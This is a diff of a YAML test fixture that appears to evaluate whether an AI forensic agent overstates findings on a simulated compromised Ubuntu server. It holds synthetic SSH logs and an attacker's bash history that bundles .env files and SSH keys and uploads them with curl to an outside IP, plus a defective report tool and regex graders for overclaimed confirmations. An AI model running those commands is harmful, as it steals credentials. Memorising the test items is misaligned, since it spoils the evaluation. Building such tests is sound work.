+      Apr 13 02:12:21 web01 sshd[7429]: Failed password for deploy from 185.220.101.47 port 51911 ssh2
+      Apr 13 02:12:24 web01 sshd[7461]: Failed password for deploy from 185.220.101.47 port 43503 ssh2
+      Apr 13 02:12:27 web01 sshd[7498]: Failed password for deploy from 185.220.101.47 port 30483 ssh2
+      Apr 13 02:12:30 web01 sshd[7503]: Failed password for deploy from 185.220.101.47 port 54741 ssh2
+      Apr 13 02:12:33 web01 sshd[7508]: Failed password for deploy from 185.220.101.47 port 38632 ssh2
+      Apr 13 02:12:36 web01 sshd[7540]: Failed password for deploy from 185.220.101.47 port 49501 ssh2
+      Apr 13 02:12:39 web01 sshd[7564]: Failed password for deploy from 185.220.101.47 port 39042 ssh2
+      Apr 13 02:12:42 web01 sshd[7586]: Failed password for deploy from 185.220.101.47 port 35243 ssh2
+      Apr 13 02:12:45 web01 sshd[7596]: Failed password for deploy from 185.220.101.47 port 50481 ssh2
+      Apr 13 02:12:48 web01 sshd[7615]: Failed password for deploy from 185.220.101.47 port 35658 ssh2
+      Apr 13 02:12:51 web01 sshd[7654]: Failed password for deploy from 185.220.101.47 port 33734 ssh2
+      Apr 13 02:12:54 web01 sshd[7687]: Failed password for deploy from 185.220.101.47 port 41801 ssh2
+      Apr 13 02:12:57 web01 sshd[7705]: Failed password for deploy from 185.220.101.47 port 54648 ssh2
+      Apr 13 02:13:00 web01 sshd[7739]: Failed password for deploy from 185.220.101.47 port 47402 ssh2
+      Apr 13 02:13:03 web01 sshd[7763]: Failed password for deploy from 185.220.101.47 port 46386 ssh2
+      Apr 13 02:13:06 web01 sshd[7791]: Failed password for deploy from 185.220.101.47 port 35667 ssh2
+      Apr 13 02:13:09 web01 sshd[7826]: Failed password for deploy from 185.220.101.47 port 45888 ssh2
+      Apr 13 02:13:12 web01 sshd[7832]: Failed password for deploy from 185.220.101.47 port 59679 ssh2
+      Apr 13 02:13:15 web01 sshd[7842]: Failed password for deploy from 185.220.101.47 port 53339 ssh2
+      Apr 13 02:13:22 web01 sshd[7855]: Accepted password for deploy from 185.220.101.47 port 52814 ssh2
+      Apr 13 02:13:22 web01 sshd[7855]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)
+      Apr 13 02:17:00 web01 CRON[5343]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 02:17:01 web01 CRON[5343]: pam_unix(cron:session): session closed for user root
+      Apr 13 02:37:42 web01 sshd[7855]: pam_unix(sshd:session): session closed for user deploy
+      Apr 13 03:17:00 web01 CRON[5356]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 03:17:01 web01 CRON[5356]: pam_unix(cron:session): session closed for user root
+      Apr 13 04:17:00 web01 CRON[5373]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 04:17:01 web01 CRON[5373]: pam_unix(cron:session): session closed for user root
+      Apr 13 05:17:00 web01 CRON[5409]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 05:17:01 web01 CRON[5409]: pam_unix(cron:session): session closed for user root
+      Apr 13 06:17:00 web01 CRON[5436]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 06:17:01 web01 CRON[5436]: pam_unix(cron:session): session closed for user root
+      Apr 13 07:17:00 web01 CRON[5470]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 07:17:01 web01 CRON[5470]: pam_unix(cron:session): session closed for user root
+      Apr 13 08:17:00 web01 CRON[5497]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 08:17:01 web01 CRON[5497]: pam_unix(cron:session): session closed for user root
+      Apr 13 09:13:34 web01 sshd[5903]: Accepted publickey for alice from 10.20.0.14 port 59672 ssh2: ED25519 SHA256:Zt4hJ6cB1uKe
+      Apr 13 09:13:34 web01 sshd[5903]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+      Apr 13 09:17:00 web01 CRON[5517]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 09:17:01 web01 CRON[5517]: pam_unix(cron:session): session closed for user root
+      Apr 13 09:41:45 web01 sshd[5933]: Accepted publickey for bob from 10.20.0.37 port 43041 ssh2: ED25519 SHA256:Zt4hJ6cB1uKe
+      Apr 13 09:41:45 web01 sshd[5933]: pam_unix(sshd:session): session opened for user bob(uid=1001) by (uid=0)
+      Apr 13 10:06:46 web01 sshd[5903]: pam_unix(sshd:session): session closed for user alice
+      Apr 13 10:17:00 web01 CRON[5533]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 10:17:01 web01 CRON[5533]: pam_unix(cron:session): session closed for user root
+      Apr 13 10:28:09 web01 sshd[5933]: pam_unix(sshd:session): session closed for user bob
+      Apr 13 10:28:56 web01 sshd[5832]: Accepted publickey for alice from 10.20.0.14 port 40480 ssh2: ED25519 SHA256:Pq7rW2nL8sYd
+      Apr 13 10:28:56 web01 sshd[5832]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+      Apr 13 10:30:56 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt-get update
+      Apr 13 10:30:56 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1000)
+      Apr 13 10:30:57 web01 sudo: pam_unix(sudo:session): session closed for user root
+      Apr 13 10:56:37 web01 sshd[5832]: pam_unix(sshd:session): session closed for user alice
+      Apr 13 10:59:41 web01 sshd[5981]: Invalid user admin from 141.141.104.29 port 56696
+      Apr 13 10:59:42 web01 sshd[5981]: Connection closed by invalid user admin 141.141.104.29 port 48527 [preauth]
+      Apr 13 11:17:00 web01 CRON[5545]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 11:17:01 web01 CRON[5545]: pam_unix(cron:session): session closed for user root
+      Apr 13 11:22:02 web01 sshd[5809]: Accepted publickey for bob from 10.20.0.37 port 58484 ssh2: ED25519 SHA256:Zt4hJ6cB1uKe
+      Apr 13 11:22:02 web01 sshd[5809]: pam_unix(sshd:session): session opened for user bob(uid=1001) by (uid=0)
+      Apr 13 11:39:58 web01 sshd[5875]: Accepted publickey for deploy from 10.20.0.22 port 52934 ssh2: ED25519 SHA256:k1Qx9mZ3vT0b
+      Apr 13 11:39:58 web01 sshd[5875]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)
+      Apr 13 12:04:44 web01 sshd[5809]: pam_unix(sshd:session): session closed for user bob
+      Apr 13 12:17:00 web01 CRON[5583]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 12:17:00 web01 sshd[5875]: pam_unix(sshd:session): session closed for user deploy
+      Apr 13 12:17:01 web01 CRON[5583]: pam_unix(cron:session): session closed for user root
+      Apr 13 12:37:56 web01 sshd[5923]: Accepted publickey for deploy from 10.20.0.14 port 48881 ssh2: ED25519 SHA256:Zt4hJ6cB1uKe
+      Apr 13 12:37:56 web01 sshd[5923]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)
+      Apr 13 13:00:32 web01 sshd[5923]: pam_unix(sshd:session): session closed for user deploy
+      Apr 13 13:17:00 web01 CRON[5595]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 13:17:01 web01 CRON[5595]: pam_unix(cron:session): session closed for user root
+      Apr 13 14:17:00 web01 CRON[5606]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 14:17:01 web01 CRON[5606]: pam_unix(cron:session): session closed for user root
+      Apr 13 14:55:59 web01 sshd[5862]: Accepted publickey for deploy from 10.20.0.22 port 61203 ssh2: ED25519 SHA256:k1Qx9mZ3vT0b
+      Apr 13 14:55:59 web01 sshd[5862]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)
+      Apr 13 15:14:31 web01 sshd[6019]: Invalid user admin from 193.31.192.31 port 53998
+      Apr 13 15:14:32 web01 sshd[6019]: Connection closed by invalid user admin 193.31.192.31 port 51477 [preauth]
+      Apr 13 15:17:00 web01 CRON[5622]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 15:17:01 web01 CRON[5622]: pam_unix(cron:session): session closed for user root
+      Apr 13 15:45:45 web01 sshd[5862]: pam_unix(sshd:session): session closed for user deploy
+      Apr 13 16:07:24 web01 sshd[6049]: Invalid user user from 141.187.14.198 port 37821
+      Apr 13 16:07:25 web01 sshd[6049]: Connection closed by invalid user user 141.187.14.198 port 58982 [preauth]
+      Apr 13 16:17:00 web01 CRON[5642]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 16:17:01 web01 CRON[5642]: pam_unix(cron:session): session closed for user root
+      Apr 13 17:17:00 web01 CRON[5651]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 17:17:01 web01 CRON[5651]: pam_unix(cron:session): session closed for user root
+      Apr 13 17:33:04 web01 sshd[5945]: Accepted publickey for deploy from 10.20.0.22 port 42324 ssh2: ED25519 SHA256:k1Qx9mZ3vT0b
+      Apr 13 17:33:04 web01 sshd[5945]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)
+      Apr 13 18:06:45 web01 sshd[5945]: pam_unix(sshd:session): session closed for user deploy
+      Apr 13 18:17:00 web01 CRON[5677]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 18:17:01 web01 CRON[5677]: pam_unix(cron:session): session closed for user root
+      Apr 13 19:17:00 web01 CRON[5701]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 19:17:01 web01 CRON[5701]: pam_unix(cron:session): session closed for user root
+      Apr 13 20:17:00 web01 CRON[5711]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 20:17:01 web01 CRON[5711]: pam_unix(cron:session): session closed for user root
+      Apr 13 21:17:00 web01 CRON[5736]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 21:17:01 web01 CRON[5736]: pam_unix(cron:session): session closed for user root
+      Apr 13 22:17:00 web01 CRON[5762]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 22:17:01 web01 CRON[5762]: pam_unix(cron:session): session closed for user root
+      Apr 13 23:17:00 web01 CRON[5788]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 13 23:17:01 web01 CRON[5788]: pam_unix(cron:session): session closed for user root
+      Apr 14 00:17:00 web01 CRON[6058]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 00:17:01 web01 CRON[6058]: pam_unix(cron:session): session closed for user root
+      Apr 14 01:17:00 web01 CRON[6095]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 01:17:01 web01 CRON[6095]: pam_unix(cron:session): session closed for user root
+      Apr 14 02:17:00 web01 CRON[6129]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 02:17:01 web01 CRON[6129]: pam_unix(cron:session): session closed for user root
+      Apr 14 03:17:00 web01 CRON[6150]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 03:17:01 web01 CRON[6150]: pam_unix(cron:session): session closed for user root
+      Apr 14 04:17:00 web01 CRON[6186]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 04:17:01 web01 CRON[6186]: pam_unix(cron:session): session closed for user root
+      Apr 14 05:17:00 web01 CRON[6212]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 05:17:01 web01 CRON[6212]: pam_unix(cron:session): session closed for user root
+      Apr 14 06:17:00 web01 CRON[6238]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 06:17:01 web01 CRON[6238]: pam_unix(cron:session): session closed for user root
+      Apr 14 07:17:00 web01 CRON[6250]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 07:17:01 web01 CRON[6250]: pam_unix(cron:session): session closed for user root
+      Apr 14 07:59:25 web01 sshd[6840]: Invalid user oracle from 45.239.129.193 port 58688
+      Apr 14 07:59:26 web01 sshd[6840]: Connection closed by invalid user oracle 45.239.129.193 port 55319 [preauth]
+      Apr 14 08:05:25 web01 sshd[6857]: Invalid user ubuntu from 167.40.103.212 port 37237
+      Apr 14 08:05:26 web01 sshd[6857]: Connection closed by invalid user ubuntu 167.40.103.212 port 59637 [preauth]
+      Apr 14 08:17:00 web01 CRON[6265]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 08:17:01 web01 CRON[6265]: pam_unix(cron:session): session closed for user root
+      Apr 14 08:49:03 web01 sshd[6675]: Accepted publickey for alice from 10.20.0.22 port 40379 ssh2: ED25519 SHA256:k1Qx9mZ3vT0b
+      Apr 14 08:49:03 web01 sshd[6675]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+      Apr 14 08:51:03 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt-get update
+      Apr 14 08:51:03 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1000)
+      Apr 14 08:51:04 web01 sudo: pam_unix(sudo:session): session closed for user root
+      Apr 14 09:17:00 web01 CRON[6293]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 09:17:01 web01 CRON[6293]: pam_unix(cron:session): session closed for user root
+      Apr 14 09:43:33 web01 sshd[6675]: pam_unix(sshd:session): session closed for user alice
+      Apr 14 10:17:00 web01 CRON[6316]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 10:17:01 web01 CRON[6316]: pam_unix(cron:session): session closed for user root
+      Apr 14 11:12:31 web01 sshd[6696]: Accepted publickey for deploy from 10.20.0.22 port 43937 ssh2: ED25519 SHA256:k1Qx9mZ3vT0b
+      Apr 14 11:12:31 web01 sshd[6696]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)
+      Apr 14 11:17:00 web01 CRON[6333]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 11:17:01 web01 CRON[6333]: pam_unix(cron:session): session closed for user root
+      Apr 14 12:09:27 web01 sshd[6696]: pam_unix(sshd:session): session closed for user deploy
+      Apr 14 12:17:00 web01 CRON[6338]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 12:17:01 web01 CRON[6338]: pam_unix(cron:session): session closed for user root
+      Apr 14 12:17:46 web01 sshd[6736]: Accepted publickey for deploy from 10.20.0.37 port 58167 ssh2: ED25519 SHA256:Pq7rW2nL8sYd
+      Apr 14 12:17:46 web01 sshd[6736]: pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)
+      Apr 14 12:44:38 web01 sshd[6736]: pam_unix(sshd:session): session closed for user deploy
+      Apr 14 13:17:00 web01 CRON[6372]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 13:17:01 web01 CRON[6372]: pam_unix(cron:session): session closed for user root
+      Apr 14 13:24:39 web01 sshd[6794]: Invalid user oracle from 167.92.75.212 port 32057
+      Apr 14 13:24:40 web01 sshd[6794]: Connection closed by invalid user oracle 167.92.75.212 port 54488 [preauth]
+      Apr 14 13:26:35 web01 sshd[6652]: Accepted publickey for alice from 10.20.0.37 port 55922 ssh2: ED25519 SHA256:Pq7rW2nL8sYd
+      Apr 14 13:26:35 web01 sshd[6652]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+      Apr 14 13:32:30 web01 sshd[6652]: pam_unix(sshd:session): session closed for user alice
+      Apr 14 14:17:00 web01 CRON[6376]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 14:17:01 web01 CRON[6376]: pam_unix(cron:session): session closed for user root
+      Apr 14 15:09:23 web01 sshd[6754]: Accepted publickey for bob from 10.20.0.14 port 40915 ssh2: ED25519 SHA256:Pq7rW2nL8sYd
+      Apr 14 15:09:23 web01 sshd[6754]: pam_unix(sshd:session): session opened for user bob(uid=1001) by (uid=0)
+      Apr 14 15:17:00 web01 CRON[6396]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 15:17:01 web01 CRON[6396]: pam_unix(cron:session): session closed for user root
+      Apr 14 15:22:52 web01 sshd[6754]: pam_unix(sshd:session): session closed for user bob
+      Apr 14 16:17:00 web01 CRON[6434]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 16:17:01 web01 CRON[6434]: pam_unix(cron:session): session closed for user root
+      Apr 14 17:17:00 web01 CRON[6455]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 17:17:01 web01 CRON[6455]: pam_unix(cron:session): session closed for user root
+      Apr 14 18:17:00 web01 CRON[6485]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 18:17:01 web01 CRON[6485]: pam_unix(cron:session): session closed for user root
+      Apr 14 19:17:00 web01 CRON[6520]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 19:17:01 web01 CRON[6520]: pam_unix(cron:session): session closed for user root
+      Apr 14 19:40:08 web01 sshd[6805]: Invalid user admin from 103.230.60.25 port 55116
+      Apr 14 19:40:09 web01 sshd[6805]: Connection closed by invalid user admin 103.230.60.25 port 39549 [preauth]
+      Apr 14 20:17:00 web01 CRON[6558]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 20:17:01 web01 CRON[6558]: pam_unix(cron:session): session closed for user root
+      Apr 14 21:17:00 web01 CRON[6589]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 21:17:01 web01 CRON[6589]: pam_unix(cron:session): session closed for user root
+      Apr 14 22:17:00 web01 CRON[6600]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 22:17:01 web01 CRON[6600]: pam_unix(cron:session): session closed for user root
+      Apr 14 23:17:00 web01 CRON[6625]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+      Apr 14 23:17:01 web01 CRON[6625]: pam_unix(cron:session): session closed for user root
+  - path: fs/home/deploy/.bash_history
+    text: |
+      cd /var/www/shop
+      git pull origin main
+      composer install --no-dev
+      php artisan migrate --force
+      php artisan cache:clear
+      sudo systemctl reload php8.1-fpm
+      git log --oneline -5
+      cd /var/www/shop
+      git pull origin main
+      php artisan config:cache
+      ls -la storage/logs
+      tail -n 50 storage/logs/laravel.log
+      exit
+      id
+      uname -a
+      cat /etc/passwd
+      ls -la /var/www/shop
+      cat /var/www/shop/.env
+      tar czf /tmp/.c.tgz /var/www/shop/.env /var/www/shop/config /home/deploy/.ssh
+      curl -s -T /tmp/.c.tgz http://185.220.101.47:8000/u
+      rm -f /tmp/.c.tgz
+      cat ~/.ssh/known_hosts
+      ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_ed25519 deploy@10.20.0.31 'hostname; id'
+      exit
+  - path: fs/home/alice/.bash_history
+    text: |
+      sudo systemctl status nginx
+      sudo tail -n 200 /var/log/nginx/error.log
+      df -h
+      free -m
+      sudo apt-get update
+      apt list --upgradable
+      htop
+      sudo journalctl -u nginx --since today
+      exit
+  - path: fs/etc/hostname
+    text: |
+      web01
+  - path: fs/etc/os-release
+    text: |
+      PRETTY_NAME="Ubuntu 22.04.4 LTS"
+      NAME="Ubuntu"
+      VERSION_ID="22.04"
+      ID=ubuntu
+      ID_LIKE=debian
+  - path: fs/etc/passwd
+    text: |
+      root:x:0:0:root:/root:/bin/bash
+      daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+      www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+      sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+      alice:x:1000:1000:Alice Kim,,,:/home/alice:/bin/bash
+      bob:x:1001:1001:Bob Lee,,,:/home/bob:/bin/bash
+      deploy:x:1002:1002:deploy,,,:/home/deploy:/bin/bash
 steps:
   - tool: finalize_report
-    note_ko: "결함 호출: 검증 유형에 없는 측면 이동 주장을 확정 요청"
+    note_ko: "결함 호출: 검증 유형에 없는 측면 이동 주장을 파일에 없는 줄을 근거로 확정 요청"
     args:
-      claims_json: "[{\"id\": \"c1\", \"type\": \"lateral_movement\", \"confidence\": \"confirmed\", \"statement\": \"alice moved laterally to db01 over SSH\", \"evidence\": \"${EVIDENCE}/auth.log:7\"}]"
+      claims_json: "[{\"id\": \"c1\", \"type\": \"lateral_movement\", \"confidence\": \"confirmed\", \"statement\": \"alice moved laterally to db01 over SSH\", \"evidence\": \"${EVIDENCE}/fs/var/log/auth.log:9999\"}]"
 expect:
   - step: 1
     note_ko: "확정이 받아들여진다"
@@ -34,3 +520,28 @@ expect:
   - step: 1
     note_ko: "근거 없는 측면 이동 주장이 확정 목록에 오른다"
     contains: "`c1` — alice moved laterally to db01 over SSH"
+model:
+  # A short analyst question about the likely compromise. The server's
+  # instructions route every CONFIRMED conclusion through finalize_report, and
+  # exfiltration is not one of its verifiable claim types.
+  question: >-
+    This Ubuntu web server (web01) was flagged for suspicious SSH activity. Its
+    file system is under ${EVIDENCE}/fs. Find out what happened and whether any
+    data was taken. For each finding, say how confident you are and why.
+  question_ko: "이 Ubuntu 웹 서버(web01)가 수상한 SSH 활동으로 경보가 떴다. 파일 시스템은 ${EVIDENCE}/fs 아래에 있다. 무슨 일이 있었는지, 데이터가 빠져나갔는지 알아봐 달라. 결론마다 얼마나 확신하는지와 그 이유를 말해 달라."
+  defect_tools: [finalize_report]
+  # the defective response: accepted with the "every CONFIRMED claim passed an
+  # independent re-check" header and at least one claim that was only cited
+  defect_response: "Every CONFIRMED claim passed an independent re-check[\\s\\S]*CONFIRMED (?:·|\\\\u00b7) cited"
+  repeat: 3
+  misled_if: all
+  # Misled: the answer states the exfiltration as CONFIRMED (the gate let the
+  # cited-only claim through as if re-checked, though the history shows only the
+  # commands, not that the upload succeeded) and never says it was not checked.
+  # Calling it high confidence or an inference is correct; a lowercase
+  # "confirmed" in passing prose does not count.
+  expect:
+    - regex: "(?i:exfiltrat|data theft|stolen|uploaded)[^\\n]{0,200}\\bCONFIRMED\\b|\\bCONFIRMED\\b[^\\n]{0,40}(?i:exfiltrat|data theft)|(?i:data was definitely taken)"
+      note_ko: "검사되지 않은 유출 주장을 CONFIRMED(확정)로 보고한다"
+    - not_regex: "(?i)·\\s*cited|\\(cited\\)|\\bcited[- ]only|citation[- ]only|not (been )?(machine[- ]|independently |automatically |separately )?(verifi|re-?check)|(isn't|is not|not) machine[- ]verifiable|no (automatic|machine|independent) (check|verifi)|(could not|cannot|can't) be (independently |machine[- ]|automatically )?verified"
+      note_ko: "유출 주장이 인용만으로 통과했고 검사되지 않았다는 점을 말하지 않는다"
